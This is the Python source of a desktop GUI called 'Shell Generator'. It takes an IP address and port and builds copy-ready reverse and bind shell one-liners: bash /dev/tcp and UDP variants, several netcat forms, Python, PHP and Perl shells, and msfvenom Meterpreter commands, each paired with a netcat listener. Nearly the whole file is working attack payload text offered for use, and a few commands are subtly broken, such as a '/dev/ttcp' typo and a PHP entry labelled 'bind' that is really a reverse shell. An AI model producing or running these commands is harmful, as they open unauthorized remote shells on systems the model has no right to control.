import customtkinter as cutk
import emoji  # Not working at the moment

PORT = int()
IP = str("Your IP")
SHELL = "bash"  # By default is `bash`
shell_option = ["/bin/sh", "bash", "/bin/bash", "cmd", "powershell", "pwsh", "ash", "bsh", "csh", "ksh", "zsh", "pdksh", "tcsh", "mksh", "dash"]

def clear_frame(frame):
    for widget in frame.winfo_children():
        widget.destroy()

def copy_to_clipboard():
    app.clipboard_clear()
    app.clipboard_append(shell_label.cget("text"))
    app.update()  # necessary to update the clipboard contents

def set_shell(shell_from_user):
    global SHELL
    SHELL = shell_from_user
    print(f"Selected: {SHELL}")

def get_the_port_from_user(event):
    global PORT
    PORT = port_entry.get()
    print(f"nc -lvnp {PORT}")
    if int(PORT) < 1000:
        listent_label.configure(text=f"sudo nc -lvnp {PORT}")
    else:
        listent_label.configure(text=f"nc -lvnp {PORT}")
    shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")

def get_the_ip_from_user(event):
    global IP
    IP = ip_entry.get()
    print(f"IP input {IP}")
    shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")

def ret_bash_i():
    shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")

def ret_bash_196():
    shell_label.configure(text=f"0<&196;exec 196<>/dev/ttcp/{IP}/{PORT}; {SHELL} <&196 >&196 2>&196")

def ret_bash_read_line():
    shell_label.configure(text=f"exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done")

def ret_bash_5():
    shell_label.configure(text=f"{SHELL} -i 5<> /dev/tcp/{IP}/{PORT} 0<&5 1>&5 2>&5")

def ret_bash_UDP():
    shell_label.configure(text=f"{SHELL} -i >& /dev/udp/{IP}/{PORT} 0>&1")

def ret_nc_mkfifo():
    shell_label.configure(text=f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{SHELL} -i 2>&1|nc {IP} {PORT} >/tmp/f")

def ret_nc_e():
    shell_label.configure(text=f"nc {IP} {PORT} -e {SHELL}")

def ret_nc_exe():
    shell_label.configure(text=f"nc.exe {IP} {PORT} -e {SHELL}")

def ret_busy_box():
    shell_label.configure(text=f"busybox nc {IP} {PORT} -e {SHELL}")

def ret_nc_c():
    shell_label.configure(text=f"nc -c {SHELL} {IP} {PORT}")

def ret_python_bind():
    shell_label.configure(text=f'''
python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",9001));s1.listen(1);c,a=s1.accept();
while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
''')

def show_reverse_shell():
    clear_frame(scrollable_frame)
    buttons = [
        ("Bash -i", ret_bash_i),
        ("Bash 196", ret_bash_196),
        ("Bash read line", ret_bash_read_line),
        ("Bash 5", ret_bash_5),
        ("Bash UDP", ret_bash_UDP),
        ("nc mkfifo", ret_nc_mkfifo),
        ("nc -e", ret_nc_e),
        ("Busybox nc -e", ret_busy_box),
        ("nc -c", ret_nc_c)
    ]
    for text, command in buttons:
        button = cutk.CTkButton(master=scrollable_frame, text=text, command=command, fg_color="gray", hover_color="red")
        button.grid(padx=3, pady=3)

def show_bind_shell():
    clear_frame(scrollable_frame)
    buttons = [
        ("Python Bind", ret_python_bind),
        ("PHP Bind", lambda: shell_label.configure(text="php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'")),
        ("nc Bind", lambda: shell_label.configure(text="nc -lvnp PORT -e /bin/sh")),
        ("Perl Bind", lambda: shell_label.configure(text="perl -e 'use Socket;$d=socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));$d->bind(INADDR_ANY,PORT);listen($d,5);while(accept(C,$d)){while(<C>){exec($_);}}'"))
    ]
    for text, command in buttons:
        button = cutk.CTkButton(master=scrollable_frame, text=text, command=command, fg_color="gray", hover_color="red")
        button.grid(padx=3, pady=3)

def show_msfvenom_shell():
    clear_frame(scrollable_frame)
    buttons = [
        ("Windows\n Meterpreter\n staged reverse\n TCP(x64)", lambda: shell_label.configure(text="msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe")),
        ("Windows\n Meterpreter\n stageless reverse\n TCP(x64)", lambda: shell_label.configure(text="msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe")),
        ("Windows\n Staged reverse\n TCP", lambda: shell_label.configure(text="msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe")),
        ("Windows\n Stageless reverse\n TCP", lambda: shell_label.configure(text="msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe"))
    ]
    for text, command in buttons:
        button = cutk.CTkButton(master=scrollable_frame, text=text, command=command, fg_color="gray", hover_color="red")
        button.grid(padx=3, pady=3)

cutk.set_appearance_mode("dark")
cutk.set_default_color_theme("blue")

app = cutk.CTk()
app.geometry("900x600")
app.title("Shell Generate V1")

app.grid_rowconfigure(0, weight=1)
app.grid_columnconfigure(0, weight=1)

main_frame = cutk.CTkFrame(master=app) 
main_frame.grid(pady=30, padx=30, row=0, column=0, sticky='nsew')

main_label = cutk.CTkLabel(master=main_frame, text='Shell Generator', font=("Roboto", 32))
main_label.grid(pady=10, padx=10, row=0, columnspan=2, sticky='nsew')

ip_port_frame = cutk.CTkFrame(master=main_frame, corner_radius=10)
ip_port_frame.grid(pady=10, padx=10, row=1, column=0, sticky='nsew')
ip_port_frame.grid_rowconfigure(1, weight=1)
ip_port_frame.grid_columnconfigure(0, weight=1)
ip_port_frame.grid_columnconfigure(1, weight=1)

ip_port_label = cutk.CTkLabel(master=ip_port_frame, text="IP & Port")
ip_port_label.grid(padx=10, pady=10, row=0, column=0)

ip_entry = cutk.CTkEntry(master=ip_port_frame, placeholder_text="Enter IP")
ip_entry.grid(padx=10, pady=10, row=1, column=0)
ip_entry.bind("<Return>", get_the_ip_from_user)

port_entry = cutk.CTkEntry(master=ip_port_frame, placeholder_text="Port")
port_entry.grid(padx=10, pady=10, row=1, column=1)
port_entry.bind("<Return>", get_the_port_from_user)

listent_frame = cutk.CTkFrame(master=main_frame, corner_radius=10)
listent_frame.grid(pady=10, padx=10, row=1, column=1, sticky='nsew')
listent_frame.grid_rowconfigure(0, weight=1)
listent_frame.grid_columnconfigure(0, weight=1)

listent_label = cutk.CTkLabel(master=listent_frame, text="Listener")
listent_label.grid(pady=10, padx=10)

listent_label = cutk.CTkLabel(master=listent_frame, width=320, text=f"nc -lvnp {PORT}")
listent_label.grid()

shell_frame = cutk.CTkFrame(master=main_frame, corner_radius=10)
shell_frame.grid(row=2, columnspan=2, sticky='nsew', padx=10, pady=10)
shell_frame.grid_rowconfigure(0, weight=1)
shell_frame.grid_columnconfigure(0, weight=1)

revers_shell = cutk.CTkButton(master=shell_frame, command=show_reverse_shell, text="Reverse", fg_color="gray", hover_color="blue", corner_radius=10)
revers_shell.grid(row=0, column=0)
bind_shell = cutk.CTkButton(master=shell_frame, command=show_bind_shell, text="Bind", fg_color="gray", hover_color="blue", corner_radius=10)
bind_shell.grid(row=0, column=1)
MSF_venom = cutk.CTkButton(master=shell_frame, command=show_msfvenom_shell, text="MSFVenom", fg_color="gray", hover_color="blue", corner_radius=10)
MSF_venom.grid(row=0, column=2)

scrollable_frame = cutk.CTkScrollableFrame(master=shell_frame, width=150, height=150)
scrollable_frame.grid(row=1, column=0)

copy_frame = cutk.CTkFrame(master=shell_frame, corner_radius=10)
copy_frame.grid(row=1, column=1)

shell_label = cutk.CTkLabel(master=copy_frame, text="Enter your IP and Port PLS!!! 😄", font=("Aria", 20), wraplength=400)
shell_label.grid(row=2, columnspan=2)

copy_button = cutk.CTkButton(main_frame, text="Copy to Clipboard", command=copy_to_clipboard)
copy_button.grid(row=3, column=1, pady=(10, 0), sticky='ew')

option_menu = cutk.CTkOptionMenu(master=shell_frame, values=shell_option, command=set_shell)
option_menu.grid(row=3, column=3, pady=20, padx=20)

meme_button = cutk.CTkButton(master=main_frame, text="Easter Egg")
meme_button.grid(row=3, column=0, pady=(10, 0), sticky='ew')

app.mainloop()
